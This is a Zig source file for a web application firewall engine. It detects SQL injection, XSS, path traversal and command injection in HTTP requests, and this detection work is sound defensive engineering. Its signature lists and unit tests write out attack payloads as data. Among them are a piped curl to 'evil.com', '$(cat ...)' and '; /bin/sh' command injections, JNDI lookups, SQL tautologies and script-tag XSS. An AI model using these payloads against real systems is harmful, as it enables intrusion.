//! Sibuna Semantic Web Application Firewall (WAF) Engine
//!
//! Zero-allocation inspection of HTTP paths, queries, headers, and bodies for
//! SQL injection, cross-site scripting, path traversal, and command injection.
//!
//! Detection is *contextual* rather than a flat substring list: a lone SQL
//! comment marker or `alert(` never fires on its own, because those bytes
//! appear in ordinary browser traffic (`Accept: */*`, JavaScript bodies).
//! Each category combines strong signatures (one hit suffices) with weak
//! signals that must co-occur with structural evidence such as a quote next
//! to a SQL keyword, an event handler inside an HTML tag, or a shell
//! separator immediately followed by a known command name.

const std = @import("std");
const rule = @import("rule.zig");
const normalizer = @import("normalizer.zig");
const aho = @import("aho_corasick.zig");
const body_fields = @import("body_fields.zig");

pub const AttackCategory = enum(u8) {
    path_traversal,
    sqli,
    xss,
    rce,

    pub fn toSlice(self: AttackCategory) []const u8 {
        return switch (self) {
            .path_traversal => "path_traversal",
            .sqli => "sqli",
            .xss => "xss",
            .rce => "rce",
        };
    }

    pub fn ruleName(self: AttackCategory) []const u8 {
        return switch (self) {
            .path_traversal => "waf:path-traversal",
            .sqli => "waf:sqli",
            .xss => "waf:xss",
            .rce => "waf:rce",
        };
    }
};

pub const Violation = struct {
    category: AttackCategory,
    pattern: []const u8,
    rule_name: []const u8,

    fn of(category: AttackCategory, pattern: []const u8) Violation {
        return .{ .category = category, .pattern = pattern, .rule_name = category.ruleName() };
    }
};

/// Bodies larger than this are inspected only over their prefix; attack
/// payloads beyond the prefix can evade this layer. The bound limits cost,
/// not application parser input; deployments must account for this limit.
pub const MAX_BODY_INSPECT: usize = body_fields.max_prefix;

/// Longest input that is canonicalised (percent-decoded, comment-stripped)
/// before the second inspection pass. Inputs beyond this are inspected raw.
pub const MAX_CANONICAL: usize = MAX_BODY_INSPECT;

pub fn containsIgnoreCase(haystack: []const u8, needle: []const u8) bool {
    return std.ascii.indexOfIgnoreCase(haystack, needle) != null;
}

fn isWordByte(c: u8) bool {
    return std.ascii.isAlphanumeric(c) or c == '_';
}

/// All strong signatures of every category live in one automaton, so a
/// field is scanned exactly once regardless of how many signatures exist.
pub const Signatures = aho.Automaton(1 + aho.patternCapacity(&traversal_strong) +
    aho.patternCapacity(&sqli_strong) + aho.patternCapacity(&xss_strong) +
    aho.patternCapacity(&rce_strong));

pub fn buildSignatures(sigs: *Signatures) void {
    sigs.* = Signatures.init();
    addAll(sigs, &traversal_strong, .path_traversal);
    addAll(sigs, &sqli_strong, .sqli);
    addAll(sigs, &xss_strong, .xss);
    addAll(sigs, &rce_strong, .rce);
    sigs.build();
}

fn addAll(sigs: *Signatures, patterns: []const []const u8, category: AttackCategory) void {
    for (patterns) |pat| {
        // The pattern tables are fixed at compile time and sized well below
        // the automaton capacity; exceeding it is a programming error.
        _ = sigs.addPatternTagged(pat, @intFromEnum(category)) catch unreachable;
    }
}

fn firstMatch(text: []const u8, patterns: []const []const u8) ?[]const u8 {
    for (patterns) |pat| {
        if (containsIgnoreCase(text, pat)) return pat;
    }
    return null;
}

const traversal_strong = [_][]const u8{
    "../",        "..\\",              "..%2f",       "..%5c",       "%2e%2e",
    "%252e",      "..;/",              "/etc/passwd", "/etc/shadow", "/proc/self",
    "win.ini",    "boot.ini",          "/etc/hosts",  "id_rsa",      ".htaccess",
    "web.config", "/windows/system32",
};

/// Byte classes gathered in one pass so the structural detectors and the
/// canonicalisation gate need no further scans of the field.
const Classes = packed struct {
    quote: bool = false,
    eq: bool = false,
    lt: bool = false,
    shell: bool = false,
    percent: bool = false,
    nul: bool = false,
    canonical: bool = false,
    double_space: bool = false,
};

const class_table: [256]u8 = blk: {
    var t = [_]u8{0} ** 256;
    t['\''] = 1;
    t['"'] = 1;
    t['`'] = 1;
    t['='] = 2;
    t['<'] = 4;
    for (";|&$`\n") |c| t[c] |= 8;
    t['%'] |= 16 | 64;
    t[0] = 32;
    for ("+\t\r\n\x0b\x0c") |c| t[c] |= 64;
    break :blk t;
};

fn scanClasses(text: []const u8) Classes {
    var bits: u8 = 0;
    var prev: u8 = 0;
    var double_space = false;
    for (text) |c| {
        bits |= class_table[c];
        if (c == ' ' and prev == ' ') double_space = true;
        if (c == '*' and prev == '/') bits |= 64;
        prev = c;
    }
    return .{
        .quote = bits & 1 != 0,
        .eq = bits & 2 != 0,
        .lt = bits & 4 != 0,
        .shell = bits & 8 != 0,
        .percent = bits & 16 != 0,
        .nul = bits & 32 != 0,
        .canonical = bits & 64 != 0,
        .double_space = double_space,
    };
}

/// A null byte can truncate application text. Opaque binary bodies and multipart file
/// payloads are selected out before text inspection; NUL is normal in those contents.
fn checkNullByte(text: []const u8, classes: Classes) ?Violation {
    if (classes.nul or (classes.percent and std.mem.indexOf(u8, text, "%00") != null)) {
        return Violation.of(.path_traversal, "%00");
    }
    return null;
}

pub fn checkPathTraversal(text: []const u8) ?Violation {
    if (firstMatch(text, &traversal_strong)) |pat| return Violation.of(.path_traversal, pat);
    return checkNullByte(text, scanClasses(text));
}

const sqli_strong = [_][]const u8{
    "union select",  "union all select", "union distinct select", "information_schema",
    "sleep(",        "benchmark(",       "load_file(",            "into outfile",
    "into dumpfile", "xp_cmdshell",      "pg_sleep(",             "waitfor delay",
    "; drop table",  "; delete from",    "; truncate ",           "@@version",
    "' or '1'='1",   "\" or \"1\"=\"1",  "' or 1=1",              "\" or 1=1",
    "or 1=1--",      "or 1=1#",          "' and '1'='1",          "extractvalue(",
    "updatexml(",    "group_concat(",    "sqlite_master",         "sysobjects",
};

const sqli_keyword_list = [_][]const u8{
    "select", "union",  "insert",  "update", "delete", "drop",    "from",
    "where",  "having", "order",   "group",  "exec",   "declare", "cast",
    "concat", "char",   "convert", "table",  "values", "limit",   "offset",
};

/// Returns the canonical static keyword equal to `word`, comparing only
/// same-length entries so a scan touches at most a handful of strings.
fn keywordName(word: []const u8) ?[]const u8 {
    for (sqli_keyword_list) |kw| {
        if (kw.len == word.len and std.mem.eql(u8, kw, word)) return kw;
    }
    return null;
}

fn hasSqlComment(text: []const u8) bool {
    return std.mem.indexOf(u8, text, "--") != null or
        std.mem.indexOf(u8, text, "/*") != null or
        std.mem.indexOf(u8, text, "#") != null;
}

fn skipSpaces(text: []const u8, start: usize) usize {
    var i = start;
    while (i < text.len and (text[i] == ' ' or text[i] == '\t')) : (i += 1) {}
    return i;
}

/// Consumes one SQL literal (digit run or quoted string) and returns the
/// index just past it, or null when `text[start]` does not begin a literal.
fn skipLiteral(text: []const u8, start: usize) ?usize {
    if (start >= text.len) return null;
    const c = text[start];
    if (std.ascii.isDigit(c)) {
        var i = start;
        while (i < text.len and std.ascii.isDigit(text[i])) : (i += 1) {}
        return i;
    }
    if (c == '\'' or c == '"') {
        const close = std.mem.indexOfScalarPos(u8, text, start + 1, c) orelse return null;
        return close + 1;
    }
    return null;
}

/// A boolean tautology is `or`/`and` followed by `literal = literal`, as in
/// `or 1=1` or `and 'a'='a'`. Identifiers on either side (`or b=2`) are
/// ordinary filter syntax and are not counted.
fn tautologyAfter(text: []const u8, word_end: usize) bool {
    const lhs_start = skipSpaces(text, word_end);
    if (lhs_start == word_end) return false;
    const lhs_end = skipLiteral(text, lhs_start) orelse return false;
    const eq = skipSpaces(text, lhs_end);
    if (eq >= text.len or text[eq] != '=') return false;
    return skipLiteral(text, skipSpaces(text, eq + 1)) != null;
}

const SqlScan = struct {
    keyword_hits: u32 = 0,
    first_keyword: []const u8 = "",
    tautology: bool = false,
};

/// One pass over the text: every alphanumeric word is looked up in the
/// keyword table, and `or`/`and` words are checked for a tautology.
fn scanSql(text: []const u8) SqlScan {
    var out = SqlScan{};
    var i: usize = 0;
    while (i < text.len) {
        if (!isWordByte(text[i])) {
            i += 1;
            continue;
        }
        const start = i;
        while (i < text.len and isWordByte(text[i])) : (i += 1) {}
        const word = text[start..i];
        if (word.len > 7) continue;
        var lower: [7]u8 = undefined;
        for (word, 0..) |c, k| lower[k] = std.ascii.toLower(c);
        const lw = lower[0..word.len];
        if (keywordName(lw)) |name| {
            if (out.keyword_hits == 0) out.first_keyword = name;
            out.keyword_hits += 1;
        } else if (std.mem.eql(u8, lw, "or") or std.mem.eql(u8, lw, "and")) {
            if (tautologyAfter(text, i)) out.tautology = true;
        }
    }
    return out;
}

/// SQL injection scoring. Strong signatures fire alone. Otherwise a quote
/// (the byte that breaks out of a string literal) is mandatory, and the
/// surrounding evidence must reach a threshold: up to two whole-word SQL
/// keywords, a comment marker, and an `=` operator each add one point.
/// Prose such as "it's a group order from the shop" scores three and
/// passes; `name='x' union all from t--` scores four and is blocked.
pub fn checkSqli(text: []const u8) ?Violation {
    if (firstMatch(text, &sqli_strong)) |pat| return Violation.of(.sqli, pat);
    return checkSqliStructure(text, scanClasses(text));
}

fn checkSqliStructure(text: []const u8, classes: Classes) ?Violation {
    const has_quote = classes.quote;
    const has_eq = classes.eq;
    // Without a quote or an equals sign no structural pattern can exist,
    // which lets ordinary header values skip the tokenizer entirely.
    if (!has_quote and !has_eq) return null;
    const scan = scanSql(text);
    if (scan.tautology) return Violation.of(.sqli, "tautology");
    if (!has_quote) return null;
    // A closing quote followed by a comment marker is the classic
    // `admin'--` termination trick and carries no keywords at all.
    if (std.mem.indexOf(u8, text, "'--") != null or std.mem.indexOf(u8, text, "'/*") != null or
        std.mem.indexOf(u8, text, "'#") != null)
    {
        return Violation.of(.sqli, "'--");
    }
    var score: u32 = 1 + @min(scan.keyword_hits, 2);
    if (hasSqlComment(text)) score += 1;
    if (has_eq) score += 1;
    if (score >= 4 and scan.keyword_hits > 0) return Violation.of(.sqli, scan.first_keyword);
    return null;
}

const xss_strong = [_][]const u8{
    "<script",     "</script",        "javascript:",        "vbscript:", "data:text/html",
    "<iframe",     "<object",         "<embed",             "<applet",   "<meta http-equiv",
    "expression(", "document.cookie", "document.write",     "eval(atob", "<base href",
    "srcdoc=",     "<svg/onload",     "<img src=x onerror",
};

const xss_tags = [_][]const u8{
    "svg",    "img",    "body",     "video",  "audio", "math",     "details", "marquee",
    "input",  "form",   "style",    "link",   "table", "div",      "span",    "a",
    "button", "select", "textarea", "iframe", "frame", "frameset", "object",  "embed",
};

/// True when `text` holds `<tag` for one of the executable-context tags.
fn hasHtmlTag(text: []const u8) bool {
    var pos: usize = 0;
    while (std.mem.indexOfScalarPos(u8, text, pos, '<')) |lt| {
        const rest = text[lt + 1 ..];
        for (xss_tags) |tag| {
            if (rest.len > tag.len and std.ascii.startsWithIgnoreCase(rest, tag)) {
                const next = rest[tag.len];
                if (next == ' ' or next == '/' or next == '>' or next == '\t') return true;
            }
        }
        pos = lt + 1;
    }
    return false;
}

/// True when an `on<event>=` attribute appears in attribute position, i.e.
/// preceded by whitespace, a slash, or a quote. `onboarding=1` in a query
/// string is not preceded by such a byte and does not count.
fn hasEventHandler(text: []const u8) bool {
    var pos: usize = 0;
    while (std.ascii.indexOfIgnoreCasePos(text, pos, "on")) |idx| {
        pos = idx + 1;
        if (idx == 0) continue;
        const prev = text[idx - 1];
        const attr_prefix = prev == ' ' or prev == '/' or prev == '"' or prev == '\'' or
            prev == '\t';
        if (!attr_prefix) continue;
        var end = idx + 2;
        while (end < text.len and std.ascii.isAlphabetic(text[end])) : (end += 1) {}
        if (end > idx + 2 and end < text.len and text[end] == '=') return true;
    }
    return false;
}

/// XSS: a strong signature, or an HTML tag that can host script combined
/// with an event-handler attribute in attribute position.
pub fn checkXss(text: []const u8) ?Violation {
    if (firstMatch(text, &xss_strong)) |pat| return Violation.of(.xss, pat);
    return checkXssStructure(text, scanClasses(text));
}

fn checkXssStructure(text: []const u8, classes: Classes) ?Violation {
    if (!classes.lt) return null;
    if (hasHtmlTag(text) and hasEventHandler(text)) return Violation.of(.xss, "on*=");
    return null;
}

const rce_strong = [_][]const u8{
    "/bin/sh",        "/bin/bash",   "/bin/zsh",      "cmd.exe",    "powershell",
    "/dev/tcp/",      "shell_exec(", "passthru(",     "proc_open(", "popen(",
    "system(",        "pcntl_exec(", "wscript.shell", "${ifs}",     "$ifs$",
    "{{7*7}}",        "${7*7}",      "#{7*7}",        "<%=7*7%>",   "${jndi:",
    "%24%7bjndi",     "__import__(", "subprocess.",   "os.system",  "runtime.getruntime",
    "processbuilder",
};

const shell_commands = [_][]const u8{
    "cat",     "ls",       "id",       "whoami",  "wget",   "curl",     "nc",   "ncat",
    "bash",    "sh",       "python",   "python3", "perl",   "php",      "ruby", "rm",
    "chmod",   "chown",    "echo",     "uname",   "ping",   "nslookup", "dig",  "sleep",
    "telnet",  "ftp",      "tftp",     "base64",  "printf", "env",      "set",  "kill",
    "netstat", "ifconfig", "ipconfig", "net",     "type",   "dir",      "del",  "mkdir",
};

fn startsWithShellCommand(text: []const u8) bool {
    var i: usize = 0;
    while (i < text.len and (text[i] == ' ' or text[i] == '\t')) : (i += 1) {}
    const rest = text[i..];
    for (shell_commands) |cmd| {
        if (std.ascii.startsWithIgnoreCase(rest, cmd)) {
            const after = rest.len == cmd.len or !isWordByte(rest[cmd.len]);
            if (after) return true;
        }
    }
    return false;
}

/// Command injection: a strong signature, or a shell separator (`;`, `|`,
/// `&&`, `$(`, backtick, newline) followed by a known command name. A bare
/// `;` or `|` is punctuation; `;wget` is a payload.
pub fn checkRce(text: []const u8) ?Violation {
    if (firstMatch(text, &rce_strong)) |pat| return Violation.of(.rce, pat);
    return checkRceStructure(text, scanClasses(text));
}

fn checkRceStructure(text: []const u8, classes: Classes) ?Violation {
    if (!classes.shell) return null;
    var i: usize = 0;
    while (i < text.len) : (i += 1) {
        const c = text[i];
        var after: usize = i + 1;
        if (c == '$' and i + 1 < text.len and text[i + 1] == '(') {
            after = i + 2;
        } else if (c == '&' and i + 1 < text.len and text[i + 1] == '&') {
            after = i + 2;
        } else if (c == '|' and i + 1 < text.len and text[i + 1] == '|') {
            after = i + 2;
        } else if (c != ';' and c != '|' and c != '`' and c != '\n' and c != '&') {
            continue;
        }
        if (after < text.len and startsWithShellCommand(text[after..])) {
            return Violation.of(.rce, "shell-separator");
        }
    }
    return null;
}

fn inspectRaw(sigs: *const Signatures, text: []const u8, classes: Classes) ?Violation {
    if (sigs.findFirstTagged(text)) |m| {
        return Violation.of(@enumFromInt(m.tag), m.name);
    }
    if (checkNullByte(text, classes)) |v| return v;
    if (checkSqliStructure(text, classes)) |v| return v;
    if (checkXssStructure(text, classes)) |v| return v;
    if (checkRceStructure(text, classes)) |v| return v;
    return null;
}

/// Inspects one text field twice: as received, then canonicalised (double
/// percent-decoding, SQL comment stripping, whitespace folding, lowercase)
/// so that `%2527/**/UnIoN` style evasion collapses onto the raw signatures.
/// Canonicalisation can only change the outcome when the input carries
/// percent escapes, plus signs, comment openers, or collapsible whitespace;
/// case never matters because every detector already folds it.
fn needsCanonical(classes: Classes) bool {
    return classes.canonical or classes.double_space;
}

pub fn inspectTextWith(sigs: *const Signatures, text: []const u8) ?Violation {
    if (text.len == 0) return null;
    const classes = scanClasses(text);
    if (inspectRaw(sigs, text, classes)) |v| return v;
    if (text.len > MAX_CANONICAL or !needsCanonical(classes)) return null;
    var norm_buf: [MAX_CANONICAL]u8 = undefined;
    const normalized = normalizer.canonicalize(text, &norm_buf);
    if (normalized.len > 0 and !std.mem.eql(u8, normalized, text)) {
        return inspectRaw(sigs, normalized, scanClasses(normalized));
    }
    return null;
}

/// Convenience for callers without a prebuilt automaton (tests, tools):
/// scans the signature tables sequentially instead.
pub fn inspectText(text: []const u8) ?Violation {
    if (text.len == 0) return null;
    if (inspectSequential(text)) |v| return v;
    if (text.len > MAX_CANONICAL or !needsCanonical(scanClasses(text))) return null;
    var norm_buf: [MAX_CANONICAL]u8 = undefined;
    const normalized = normalizer.canonicalize(text, &norm_buf);
    if (normalized.len > 0 and !std.mem.eql(u8, normalized, text)) {
        return inspectSequential(normalized);
    }
    return null;
}

fn inspectSequential(text: []const u8) ?Violation {
    if (checkPathTraversal(text)) |v| return v;
    if (checkSqli(text)) |v| return v;
    if (checkXss(text)) |v| return v;
    if (checkRce(text)) |v| return v;
    return null;
}

/// Mixed modes use the same category detectors and canonicalization as the all-enforce
/// path. Inspecting categories separately prevents an audited first match hiding a deny.
pub fn inspectCategory(
    sigs: *const Signatures,
    comptime category: AttackCategory,
    text: []const u8,
) ?Violation {
    if (text.len == 0) return null;
    if (inspectRawCategory(sigs, category, text)) |hit| return hit;
    if (text.len > MAX_CANONICAL or !needsCanonical(scanClasses(text))) return null;
    var buffer: [MAX_CANONICAL]u8 = undefined;
    const normalized = normalizer.canonicalize(text, &buffer);
    if (normalized.len == 0 or std.mem.eql(u8, normalized, text)) return null;
    return inspectRawCategory(sigs, category, normalized);
}

fn inspectRawCategory(
    sigs: *const Signatures,
    comptime category: AttackCategory,
    text: []const u8,
) ?Violation {
    if (sigs.findFirstTaggedAs(text, @intFromEnum(category))) |match|
        return Violation.of(category, match.name);
    const classes = scanClasses(text);
    return switch (category) {
        .path_traversal => checkNullByte(text, classes),
        .sqli => checkSqliStructure(text, classes),
        .xss => checkXssStructure(text, classes),
        .rce => checkRceStructure(text, classes),
    };
}

/// Headers whose grammar legitimately contains `*/*`, `;q=`, quotes, and
/// slashes. Their values are machine-generated content negotiation, not
/// user-controlled input, so scanning them yields only false positives.
const structural_headers = [_][]const u8{
    "accept",            "accept-encoding",           "accept-language", "accept-charset",
    "content-type",      "content-length",            "host",            "connection",
    "cache-control",     "pragma",                    "range",           "if-none-match",
    "if-modified-since", "if-match",                  "if-range",        "te",
    "transfer-encoding", "upgrade-insecure-requests", "dnt",             "sec-ch-ua",
    "sec-ch-ua-mobile",  "sec-ch-ua-platform",        "sec-fetch-dest",  "sec-fetch-mode",
    "sec-fetch-site",    "sec-fetch-user",            "sec-gpc",         "priority",
    "x-forwarded-proto", "x-forwarded-port",          "keep-alive",      "origin",
};

pub fn isStructuralHeader(name: []const u8) bool {
    for (structural_headers) |h| {
        if (std.ascii.eqlIgnoreCase(name, h)) return true;
    }
    return false;
}

pub fn inspectRequest(
    sigs: *const Signatures,
    request: @import("request.zig").View,
) ?Violation {
    if (inspectTextWith(sigs, request.path)) |v| return v;
    if (inspectTextWith(sigs, request.query)) |v| return v;
    if (inspectTextWith(sigs, request.user_agent)) |v| return v;
    for (request.headers) |h| {
        if (isStructuralHeader(h.name)) continue;
        if (inspectTextWith(sigs, h.value)) |v| return v;
    }
    var fields = body_fields.Fields.init(request.headers, request.body);
    while (fields.next()) |text| if (inspectTextWith(sigs, text)) |v| return v;
    return null;
}

test "checkPathTraversal detects traversal patterns" {
    try std.testing.expect(checkPathTraversal("/app/static/../../etc/passwd") != null);
    try std.testing.expect(checkPathTraversal("/api/%2e%2e/admin") != null);
    try std.testing.expect(checkPathTraversal("/download?f=a%00.png") != null);
    try std.testing.expect(checkPathTraversal("/safe/path/image.png") == null);
}

test "checkSqli detects injection but not prose or content negotiation" {
    try std.testing.expect(checkSqli("admin' OR '1'='1") != null);
    try std.testing.expect(checkSqli("id=1 UNION SELECT null, username FROM users") != null);
    try std.testing.expect(checkSqli("q=x' and 1=1 order by 3 -- ") != null);
    try std.testing.expect(checkSqli("user=admin'--") != null);
    try std.testing.expect(checkSqli("name=JohnDoe") == null);
    try std.testing.expect(checkSqli("text/html,application/xml;q=0.9,*/*;q=0.8") == null);
    try std.testing.expect(checkSqli("please select a table from the menu") == null);
    try std.testing.expect(checkSqli("it's a group order from the shop") == null);
    try std.testing.expect(checkSqli("id=1 or 1=1") != null);
    try std.testing.expect(checkSqli("id=5 or b=2") == null);
    try std.testing.expect(checkSqli("I'd select the second option -- it's cheaper") == null);
    try std.testing.expect(checkSqli("name='x' union all from t--") != null);
}

test "checkXss detects script injection but not plain markup words" {
    try std.testing.expect(checkXss("<script>alert(1)</script>") != null);
    try std.testing.expect(checkXss("<img src=x onerror=alert(1)>") != null);
    try std.testing.expect(checkXss("<svg/onload=alert(1)>") != null);
    try std.testing.expect(checkXss("<a href=\"javascript:alert(1)\">x</a>") != null);
    try std.testing.expect(checkXss("plain text input") == null);
    try std.testing.expect(checkXss("onboarding=1&alert(true)") == null);
    try std.testing.expect(checkXss("<div class=\"a\">hello</div>") == null);
}

test "checkRce detects command injection but not punctuation" {
    try std.testing.expect(checkRce("127.0.0.1; /bin/sh") != null);
    try std.testing.expect(checkRce("input|curl http://evil.com") != null);
    try std.testing.expect(checkRce("x=$(cat /etc/hostname)") != null);
    try std.testing.expect(checkRce("host=a && whoami") != null);
    try std.testing.expect(checkRce("${jndi:ldap://x}") != null);
    try std.testing.expect(checkRce("status ok; done | next") == null);
    try std.testing.expect(checkRce("a=1&b=2&c=3") == null);
}

test "inspectText blocks obfuscated WAF evasion attacks" {
    try std.testing.expect(inspectText("id=%27%20or%20%271%27=%271") != null);
    try std.testing.expect(inspectText("1'/**/UnIoN/**/SeLeCt/**/1") != null);
    try std.testing.expect(inspectText("/api/%252e%252e/%252e%252e/etc/passwd") != null);
    try std.testing.expect(inspectText("<img%20src=x%20onerror=alert(1)>") != null);
}

fn testSignatures() !*Signatures {
    const sigs = try std.testing.allocator.create(Signatures);
    buildSignatures(sigs);
    return sigs;
}

test "automaton and sequential scans agree on every signature" {
    const sigs = try testSignatures();
    defer std.testing.allocator.destroy(sigs);
    const all = [_][]const []const u8{ &traversal_strong, &sqli_strong, &xss_strong, &rce_strong };
    for (all) |table| {
        for (table) |pat| {
            var buf: [96]u8 = undefined;
            const text = try std.fmt.bufPrint(&buf, "prefix {s} suffix", .{pat});
            const fast = inspectTextWith(sigs, text);
            const slow = inspectText(text);
            try std.testing.expect(fast != null and slow != null);
            try std.testing.expectEqual(slow.?.category, fast.?.category);
        }
    }
}

test "inspectRequest passes a real browser request untouched" {
    const sigs = try testSignatures();
    defer std.testing.allocator.destroy(sigs);
    const headers = [_]rule.Header{
        .{ .name = "Host", .value = "example.com" },
        .{ .name = "Accept", .value = "text/html,application/xhtml+xml,application/xml;q=0.9," ++
            "image/avif,image/webp,*/*;q=0.8" },
        .{ .name = "Accept-Language", .value = "en-US,en;q=0.5" },
        .{ .name = "Accept-Encoding", .value = "gzip, deflate, br" },
        .{ .name = "Cookie", .value = "session=abc--def; theme=dark" },
        .{ .name = "Referer", .value = "https://example.com/blog?tag=c%2B%2B" },
        .{ .name = "Sec-Ch-Ua", .value = "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\"" },
    };
    const ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 " ++
        "(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36";
    const body = "{\"comment\":\"I'd select the second option -- it's cheaper\"}";
    try std.testing.expect(inspectRequest(sigs, .{
        .path = "/blog/post-1",
        .query = "tag=c%2B%2B&page=2",
        .user_agent = ua,
        .headers = &headers,
        .body = body,
    }) == null);
}

test "inspectRequest still catches attacks in custom headers and bodies" {
    const sigs = try testSignatures();
    defer std.testing.allocator.destroy(sigs);
    const headers = [_]rule.Header{
        .{ .name = "X-Query", .value = "<script>alert(1)</script>" },
    };
    const v = inspectRequest(sigs, .{ .path = "/search", .headers = &headers }).?;
    try std.testing.expectEqual(AttackCategory.xss, v.category);
    const b = inspectRequest(sigs, .{ .path = "/submit", .body = "cmd=test; /bin/sh" }).?;
    try std.testing.expectEqual(AttackCategory.rce, b.category);
    const q = inspectRequest(sigs, .{
        .path = "/search",
        .query = "q=1%27%20union%20select%20null--",
    }).?;
    try std.testing.expectEqual(AttackCategory.sqli, q.category);
}

test "encoded payload after two kilobytes is canonicalised" {
    var payload: [4096]u8 = undefined;
    @memset(&payload, 'a');
    const attack = "%3Cscript%3Ealert(1)%3C/script%3E";
    @memcpy(payload[3000..][0..attack.len], attack);
    try std.testing.expect(inspectText(&payload) != null);
}
